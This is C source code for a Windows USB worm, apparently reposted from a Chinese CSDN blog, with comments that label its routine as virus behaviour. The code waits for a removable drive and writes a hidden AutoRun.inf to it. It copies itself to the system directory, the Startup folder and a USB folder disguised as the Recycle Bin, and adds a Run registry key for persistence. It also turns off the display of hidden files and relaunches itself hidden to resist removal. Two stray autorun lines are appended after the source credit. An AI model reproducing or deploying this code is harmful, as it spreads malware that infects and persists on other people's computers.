#include "stdafx.h"
#include <stdio.h>
 
//全局变量好办事
char U_path[]="a:\\回收站.{645FF040-5081-101B-9F08-00AA002F954E}";//默认u盘路径为a
 
//获得正确U盘盘符
char GetUName()
{
	char i;
	char u_path[7]="";
	
	for (i='a';i<='z';i++)
	{
		u_path[0]=i;
		u_path[1]=':';
		u_path[2]='\\';
		u_path[3]='\\';
		u_path[4]='\0';
		if (GetDriveType(u_path)==DRIVE_REMOVABLE)//判断一个磁盘驱动器的类型
		{
			return i;
		}
	}
	return NULL;
}
bool CheckDisk()
{
	if (GetUName()!=NULL)
	{
		U_path[0]=GetUName();  //更新U盘盘符
		return true;
	}
	return false;
}
 
//每过5秒扫描一次
void ScanDisk()
{
	while (!CheckDisk()) //是否插入U盘
	{
		Sleep(5000);
	}
}
//病毒行为！
void VirusAction()
{
	//双击U盘运行程序的AutoRun.inf
	char f_inf_name[]="a:\\AutoRun.inf";
	f_inf_name[0]=U_path[0];   
	char f_inf_content[]="[AutoRun]\r\nShellExecute=mas.exe";
	FILE *pf_inf = fopen(f_inf_name,"wb+");  
	if (pf_inf!=NULL)
	{
		fwrite(f_inf_content,sizeof(char),sizeof(f_inf_content),pf_inf); 
		fclose(pf_inf);
	}
	SetFileAttributes(f_inf_name,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);  
	//设置文件属性，隐藏，只读，系统
	
	//拷贝到系统目录
	char path_system[MAX_PATH];
	GetSystemDirectory(path_system,MAX_PATH);  
	strcat(path_system,"\\mas.exe");
	char path_thisEXE[MAX_PATH];
	GetModuleFileName(NULL,path_thisEXE,MAX_PATH);  
	
	//If this parameter is TRUE and the new file already exists, the function fails
	CopyFile(path_thisEXE,path_system,TRUE); 
	
	//拷贝到U盘
	CreateDirectory(U_path,NULL); 
	strcat(U_path,"\\mas.exe");
	CopyFile(path_thisEXE,U_path,TRUE);
 
	//开机启动此程序
	HKEY h_openkey;  
	DWORD cbData_1=200;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&h_openkey); //打开一个指定的注册表键
	RegSetValueEx(h_openkey,"KeyName",0,REG_SZ,(BYTE*)path_system,cbData_1);
	RegCloseKey(h_openkey);
	
	char t_AutoStartPath[MAX_PATH]="C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动";
	strcat(t_AutoStartPath,"\\mas.exe");
	CopyFile(path_thisEXE,t_AutoStartPath,TRUE);
	
	//////////////////////////////////////////////////////////////////////////
	//隐藏程序
	//设置隐藏文件夹不可见
	DWORD Data=2;
	RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",0,KEY_ALL_ACCESS,&h_openkey);
	RegSetValueEx(h_openkey,"Hidden",0,REG_DWORD,(const BYTE*)(&Data),sizeof(Data));
	RegCloseKey(h_openkey);
 
 
	//执行U盘里那个程序，防止删除
	if (strcmp(path_thisEXE,U_path)!=0)	
	{ 
		WinExec(U_path,SW_HIDE);  
	}
	else
	{
		while(1)//死循环永远不退出程序
		{
			Sleep(50*1000);//降低CPU负载
		}
	}
 
}
 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
 
	//主程序包括两部分：磁盘扫描和病毒感染
	
	//磁盘扫描
	ScanDisk();
 
	//扫描不到U盘下个函数就不会执行
	//病毒感染
	VirusAction();
 
	return 0;
}
--------------------- 
作者：H-KING 
来源：CSDN 
原文：https://blog.csdn.net/liujiayu2/article/details/47355855 
版权声明：本文为博主原创文章，转载请附上博文链接！
//	char f_inf_content[]="[AutoRun]\r\nopen=.\\回收站.{645FF040-5081-101B-9F08-00AA002F954E}\\20130927.exe\r\nshell\\open\\Command=.\\回收站.{645FF040-5081-101B-9F08-00AA002F954E}\\20130927.exe\r\nshell\\explore\\Command=.\\回收站.{645FF040-5081-101B-9F08-00AA002F954E}\\20130927.exe";
	char f_inf_content[]="[AutoRun]\r\nShellExecute=explorer.exe";
